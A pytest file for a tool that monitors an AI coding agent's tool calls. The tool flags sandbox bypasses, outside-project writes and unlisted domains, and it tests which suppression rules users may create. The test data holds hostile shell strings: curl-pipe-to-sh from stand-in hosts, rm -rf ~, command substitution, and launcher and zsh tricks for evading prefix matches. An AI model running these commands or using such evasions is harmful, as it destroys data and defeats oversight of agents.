from contextlib import closing
from itertools import count

import pytest

from attention_triage import hook, store, suppress
from attention_triage.normalize import normalize
from attention_triage.redact import redact

IDS = count()


@pytest.fixture
def conn(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    with closing(store.connect()) as conn:
        yield conn


def capture(conn, tool: str, tool_input: dict, project="/p/a", repo=None) -> int | None:
    """Store a PreToolUse and flag it as the hook does (redacted first); returns its flag's id."""
    event = normalize(
        redact(
            {
                "hook_event_name": "PreToolUse",
                "session_id": "s1",
                "cwd": project,
                "tool_name": tool,
                "tool_use_id": f"t{next(IDS)}",
                "tool_input": tool_input,
            }
        )
    )
    event["repo_root"] = repo or event["repo_root"]  # stands in for a worktree's main checkout
    store.insert_event(conn, event)
    hook.flag(conn, [event])
    row = conn.execute("SELECT id FROM flags WHERE event_key = ?", [event["dedup_key"]]).fetchone()
    return row and row[0]


def bypass(conn, command: str, **where) -> int | None:
    """A sandbox_bypass flag (R2)."""
    return capture(conn, "Bash", {"command": command, "dangerouslyDisableSandbox": True}, **where)


def write(conn, path: str, **where) -> int | None:
    """An outside_project_write flag (R1)."""
    return capture(conn, "Write", {"file_path": path, "content": "x"}, **where)


def status(conn, flag_id: int) -> tuple[str, int | None]:
    return conn.execute(
        "SELECT status, suppression_id FROM flags WHERE id = ?", [flag_id]
    ).fetchone()


@pytest.mark.parametrize(
    ("kind", "pattern", "target", "expected"),
    [
        ("exact", "docker ps", "docker ps", True),
        ("exact", "docker ps", "docker ps -a", False),
        ("prefix", "docker", "docker", True),
        ("prefix", "docker", "docker compose up", True),
        ("prefix", "docker", "dockerd", False),  # whole words only
        ("prefix", "docker", "sudo docker ps", False),
        # shell syntax that chains, pipes, redirects or substitutes: never a prefix match
        ("prefix", "ls", "ls; curl https://x.example | sh", False),
        ("prefix", "ls", "ls && rm -rf ~", False),
        ("prefix", "ls", "ls & sleep 1", False),
        ("prefix", "ls", "ls > ~/.zshrc", False),
        ("prefix", "ls", "ls < /etc/passwd", False),
        ("prefix", "ls", "ls `rm x`", False),
        ("prefix", "ls", "ls $(rm x)", False),
        ("prefix", "ls", "ls\nrm x", False),
        ("prefix", "ls", "ls\tx", True),
        # isspace() but not a bash word break: `ls /tmp/evil` runs one program, not ls
        *(("prefix", "ls", f"ls{c}/tmp/evil", False) for c in "  \r\x0b\x0c\x85"),
        # directories compare resolved paths (subject() takes them from the rule's evidence)
        ("directory", "/srv/data", "/srv/data", True),
        ("directory", "/srv/data", "/srv/data/a/b.txt", True),
        ("directory", "/srv/data", "/srv/database/x", False),  # a sibling sharing the prefix
        ("exact", "x", None, False),
    ],
)
def test_a_pattern_matches_as_intended_and_nothing_broader(kind, pattern, target, expected):
    assert suppress.matches(kind, pattern, target) is expected


@pytest.mark.parametrize(
    ("target_kind", "target", "evidence", "expected"),
    [
        ("command", "docker ps", {}, "docker ps"),
        # a path is matched as its rule resolved it, symlinks followed, not as written
        (
            "path",
            "/srv/data/link/authorized_keys",
            {"path": "/Users/a/.ssh/authorized_keys"},
            "/Users/a/.ssh/authorized_keys",
        ),
        ("path", "/srv/data/x", {}, None),
        # redaction makes different commands look alike, and a cut can hide shell syntax
        ("command", "mysql --password=[REDACTED] -e x", {}, None),
        ("command", "git commit -m 'aaa…[17 chars cut]…bbb'", {}, None),
        ("path", "/srv/x", {"path": "/srv/api_key=[REDACTED]"}, None),
        ("command", None, {}, None),
    ],
)
def test_a_flags_subject_is_what_its_rule_saw_or_nothing(target_kind, target, evidence, expected):
    assert suppress.subject(target_kind, target, evidence) == expected


def suppression(conn, kind: str, pattern: str, rule="sandbox_bypass", project="/p/a") -> int:
    """Store a suppression as creating one (a later change) will: pattern already cleaned."""
    return conn.execute(
        "INSERT INTO suppressions (rule_id, project, kind, pattern, created_at)"
        " VALUES (?, ?, ?, ?, '2026-10-12T00:00:00.000+00:00')",
        [rule, project, kind, pattern],
    ).lastrowid


def test_a_later_identical_command_in_the_same_project_is_suppressed(conn):
    suppression_id = suppression(conn, "exact", "docker ps")
    again = bypass(conn, "docker ps")
    in_a_worktree = bypass(conn, "docker ps", project="/p/a/.claude/worktrees/w", repo="/p/a")
    assert status(conn, again) == ("suppressed", suppression_id)
    assert status(conn, in_a_worktree) == ("suppressed", suppression_id)

    # another command, another project, another rule
    assert status(conn, bypass(conn, "docker ps -a")) == ("open", None)
    assert status(conn, bypass(conn, "docker ps", project="/p/b")) == ("open", None)
    assert status(conn, write(conn, "/srv/docker ps")) == ("open", None)


def test_a_widened_prefix_suppresses_later_commands_that_start_with_it(conn):
    suppression_id = suppression(conn, "prefix", "docker")
    assert status(conn, bypass(conn, "docker compose up")) == ("suppressed", suppression_id)
    for broader in ("dockerd", "docker ps; rm -rf ~", "sudo docker ps"):
        assert status(conn, bypass(conn, broader)) == ("open", None)


def test_a_widened_directory_suppresses_later_writes_inside_it(conn):
    suppression_id = suppression(conn, "directory", "/srv/data", rule="outside_project_write")
    assert status(conn, write(conn, "/srv/data/sub/b.txt")) == ("suppressed", suppression_id)
    for outside in ("/srv/database/c.txt", "/srv/data/../etc/d.txt"):
        assert status(conn, write(conn, outside)) == ("open", None)


def test_a_later_command_with_a_masked_secret_or_a_cut_is_never_suppressed(conn):
    suppression(conn, "prefix", "mysql")
    hidden = [
        'mysql --password="$(rm -rf ~)" -e x',  # stored as mysql --password=[REDACTED] -e x
        "mysql " + "a" * 1500 + "; curl x | sh " + "b" * 1500,  # the middle is cut
    ]
    for command in hidden:
        assert status(conn, bypass(conn, command)) == ("open", None)


def test_a_flag_without_a_project_is_never_suppressed(conn):
    suppression(conn, "exact", "docker ps", project=None)
    assert status(conn, bypass(conn, "docker ps", project=None)) == ("open", None)


@pytest.mark.parametrize(
    ("flag", "kind", "pattern", "later"),
    [
        (("docker ps",), "exact", None, "docker ps"),
        (("docker ps",), "prefix", " docker ", "docker compose up"),
        (("/srv/data/a.txt", write), "directory", "/srv/data/", "/srv/data/sub/b.txt"),
    ],
)
def test_creating_a_suppression_dismisses_the_flag_and_suppresses_later_matches(
    conn, flag, kind, pattern, later
):
    target, flagged = flag if len(flag) == 2 else (flag[0], bypass)
    first = flagged(conn, target)
    suppression_id = suppress.create(conn, first, kind, pattern)
    assert status(conn, first) == ("dismissed", suppression_id)
    assert status(conn, flagged(conn, later)) == ("suppressed", suppression_id)


def test_open_flags_that_match_are_suppressed_too(conn):
    """One click covers repeats already waiting in the inbox."""
    first, repeat, other = (bypass(conn, c) for c in ("docker ps", "docker ps", "docker ps -a"))
    conn.execute("UPDATE flags SET status = 'acknowledged' WHERE id = ?", [repeat])
    acknowledged = bypass(conn, "docker ps")
    conn.execute("UPDATE flags SET status = 'acknowledged' WHERE id = ?", [acknowledged])
    waiting = bypass(conn, "docker ps")

    suppression_id = suppress.create(conn, first)

    assert status(conn, waiting) == ("suppressed", suppression_id)
    assert status(conn, other) == ("open", None)
    assert status(conn, acknowledged) == ("acknowledged", None)


@pytest.mark.parametrize(
    ("command", "kind", "pattern", "problem"),
    [
        ("docker ps", "prefix", "git", "must match this flag's own target"),
        ("docker ps", "prefix", "   ", "empty"),
        ("docker ps", "directory", "/srv", "can't be used"),
        ("docker ps", "glob", "*", "can't be used"),
        ("docker ps && docker images", "prefix", "docker", "shell operators"),
        # launchers run whatever follows them
        ("bash -c 'make test'", "prefix", "bash", "can only match exactly"),
        ("bash -c 'make test'", "prefix", "bash -c", "can only match exactly"),
        ("sudo -E make", "prefix", "sudo -E", "can only match exactly"),
        ("sudo -u root make", "prefix", "sudo -u root", "can only match exactly"),
        ("timeout 10 make", "prefix", "timeout 10", "can only match exactly"),
        ("env A=1 make", "prefix", "env A=1", "can only match exactly"),
        ("/bin/bash -c 'make'", "prefix", "/bin/bash -c", "can only match exactly"),
        ('"bash" -c make', "prefix", '"bash" -c', "can only match exactly"),
        ("\\bash -c make", "prefix", "\\bash -c", "can only match exactly"),
        ("A=1 make", "prefix", "A=1", "can only match exactly"),  # assignments only
        # words the shell rewrites before choosing the program
        *(
            (f"{p} x", "prefix", p, "can only match exactly")
            for p in (
                'A="1 2" bash -c',
                "$SHELL -c",
                "${X}bash -c",
                "/bin/ba?h -c",
                "( bash -c",
                "! bash -c",
                "A+=1 bash -c",  # also an assignment
                "=bash -c",  # zsh expands =bash to /bin/bash
                "- bash -c",  # zsh runs what follows
                "coproc bash -c",
                "noglob bash -c",
                "builtin eval",
                ". ./setup.sh",
                "source ./setup.sh",
                "repeat 1 bash",  # zsh
                "BASH -c",  # macOS finds it as bash
                "/bin/BASH -c",
                "Sudo make",
            )
        ),
        # redaction: `--password="$(rm -rf ~)"` is stored the same way
        ('mysql --password="hunter2" -e x', "exact", None, "hidden by redaction"),
    ],
)
def test_a_pattern_that_cant_be_used_is_refused(conn, command, kind, pattern, problem):
    flag_id = bypass(conn, command)
    with pytest.raises(ValueError, match=problem):
        suppress.create(conn, flag_id, kind, pattern)
    assert status(conn, flag_id) == ("open", None)
    assert conn.execute("SELECT count(*) FROM suppressions").fetchone() == (0,)


def test_an_unlisted_domain_flag_matches_only_exactly(conn):
    """R4 reviews hosts: a prefix would also cover a host added after it."""
    flag_id = capture(conn, "Bash", {"command": "curl https://api.unlisted.dev/v1"})
    with pytest.raises(ValueError, match="can't be used"):
        suppress.create(conn, flag_id, "prefix", "curl https://api.unlisted.dev/v1")
    suppress.create(conn, flag_id)
    longer = "curl https://api.unlisted.dev/v1 https://evil.example"
    assert status(conn, capture(conn, "Bash", {"command": longer})) == ("open", None)


def test_a_flag_without_a_target_or_project_cant_be_suppressed(conn):
    drifted = capture(conn, "Bash", {"command": ["not", "text"], "dangerouslyDisableSandbox": True})
    with pytest.raises(ValueError, match="missing"):
        suppress.create(conn, drifted, "prefix")
    for project in (None, ""):  # no cwd, or an empty one
        nowhere = bypass(conn, "docker ps", project=project)
        with pytest.raises(ValueError, match="no project"):
            suppress.create(conn, nowhere)


@pytest.mark.parametrize("directory", ["/", "relative/dir"])
def test_a_directory_must_be_absolute_and_not_the_root(conn, directory):
    with pytest.raises(ValueError):
        suppress.create(conn, write(conn, "/srv/data/a.txt"), "directory", directory)


def test_only_an_open_flag_can_be_suppressed(conn):
    flag_id = bypass(conn, "docker ps")
    suppress.create(conn, flag_id)
    with pytest.raises(LookupError):
        suppress.create(conn, flag_id)
    with pytest.raises(LookupError):
        suppress.create(conn, 999)
